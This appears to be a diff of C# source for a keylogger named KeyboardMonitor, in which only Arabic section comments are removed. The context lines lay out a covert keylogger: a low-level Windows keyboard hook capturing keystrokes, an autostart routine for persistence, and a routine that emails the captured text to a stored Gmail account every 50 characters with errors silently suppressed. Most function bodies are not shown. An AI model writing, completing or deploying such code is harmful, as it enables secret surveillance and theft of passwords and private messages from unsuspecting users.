@@ -11,7 +11,6 @@ namespace KeyboardMonitor
 {
     class Program
     {
-        // 1. المتغيرات العامة
         private static string myEmail = "example@gmail.com";
         private static string myAppPassword = "----------------";
         private static int sendEveryXCharacters = 50;
@@ -19,7 +18,6 @@ namespace KeyboardMonitor
         private static string interceptedData = "";
         private static int keyCounter = 0;
 
-        // 2. نقطة انطلاق البرنامج
         static void Main(string[] args)
         {
             EnsureStartup();
@@ -28,7 +26,6 @@ namespace KeyboardMonitor
             UnhookWindowsHookEx(_hookID);
         }
 
-        // 3. دالة التقاط المفاتيح
         private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)0x0100)
@@ -60,7 +57,6 @@ namespace KeyboardMonitor
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        // 4. دالة دعم اللغة العربية
         private static string GetCharsFromKeys(Keys keys, bool shift)
         {
             var buf = new StringBuilder(256);
@@ -71,7 +67,6 @@ namespace KeyboardMonitor
             return buf.ToString();
         }
 
-        // 5. دالة التشغيل التلقائي
         private static void EnsureStartup()
         {
             try
@@ -82,7 +77,6 @@ namespace KeyboardMonitor
             catch { }
         }
 
-        // 6. دالة إرسال الإيميل
         private static void SendLog()
         {
             try
@@ -96,7 +90,6 @@ namespace KeyboardMonitor
             catch { }
         }
 
-        // 7. محرك الـ Hook (SetHook)
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -106,7 +99,6 @@ namespace KeyboardMonitor
             }
         }
 
-        // 8. تعريفات نظام ويندوز (WinAPI)
         [DllImport("user32.dll")]
         private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
 
